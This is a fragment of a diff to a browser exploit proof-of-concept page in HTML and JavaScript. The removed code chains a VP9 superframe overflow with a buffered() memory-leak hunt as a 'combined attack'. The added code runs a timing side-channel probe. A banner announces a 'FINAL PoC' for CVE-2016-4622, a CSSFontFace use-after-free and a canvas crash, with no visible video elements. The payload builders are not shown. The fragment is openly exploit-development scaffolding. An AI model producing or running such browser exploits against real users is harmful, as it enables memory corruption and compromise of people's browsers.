 }
 
-// ============================================================
-// Combined
-// ============================================================
-async function combinedVP9Buffered() {
-  log('=== 🔥 COMBINED: VP9 + buffered() ===', 'err');
-  document.getElementById('status').textContent = 'Combined Attack...';
+function huntTimingSideChannel() {
+  log('=== 🔍 Timing Side-Channel ===', 'blue');
   
-  // Step 1: VP9 append
-  const vp9Data = makeSuperframeOverflow();
-  await testVP9Vector('VP9 (Combined)', vp9Data);
+  // Measure time to access properties — may reveal cache state
+  var obj = {a: 1, b: 2, c: 3, d: 4, e: 5};
+  var times = [];
   
-  // Step 2: buffered() hunt
-  await bufferedSingleTest();
+  for (var i = 0; i < 1000; i++) {
+    var t0 = performance.now();
+    var x = obj.a + obj.b + obj.c + obj.d + obj.e;
+    var t1 = performance.now();
+    times.push(t1 - t0);
+  }
   
-  log('=== COMBINED COMPLETE ===', 'ok');
-  document.getElementById('status').textContent = 'Combined Complete';
+  var avg = times.reduce(function(a,b){return a+b;}, 0) / times.length;
+  var min = Math.min.apply(null, times);
+  var max = Math.max.apply(null, times);
+  
+  log('Property access timing — avg: '+avg.toFixed(4)+'ms, min: '+min.toFixed(4)+'ms, max: '+max.toFixed(4)+'ms', 'info');
+  
+  // Try with different object shapes
+  var objs = [];
+  for (var i = 0; i < 100; i++) {
+    var o = {a: i};
+    if (i % 2 === 0) o.b = i;
+    if (i % 3 === 0) o.c = i;
+    objs.push(o);
+  }
+  
+  var t0 = performance.now();
+  for (var i = 0; i < objs.length; i++) {
+    var x = objs[i].a;
+  }
+  var t1 = performance.now();
+  log('100 polymorphic objects: '+(t1-t0).toFixed(3)+'ms', 'info');
 }
 
 // Global handlers
-window.onerror = (m,u,l,c,e) => { log('GLOBAL: '+m+' @'+l+':'+c, 'err'); storeResult('GLOBAL_ERROR', m, {}); };
-window.onunhandledrejection = e => { log('REJECTION: '+e.reason, 'err'); storeResult('REJECTION', e.reason, {}); };
+window.onerror = function(m,u,l,c,e) { log('GLOBAL: '+m+' @'+l+':'+c, 'err'); };
+window.onunhandledrejection = function(e) { log('REJECTION: '+e.reason, 'err'); };
 
-log('PoC v9 loaded. VP9 Fuzzer + buffered() Leak Hunter.', 'ok');
-log('Press 🔥 RUN VP9 FUZZER or 🔍 RUN buffered() LEAK HUNTER', 'warn');
+log('FINAL PoC loaded.', 'ok');
+log('CVE-2016-4622 + CSSFontFace UAF + Canvas Crash', 'ok');
+log('No visible video elements.', 'ok');
 </script>
 </body>
 </html>
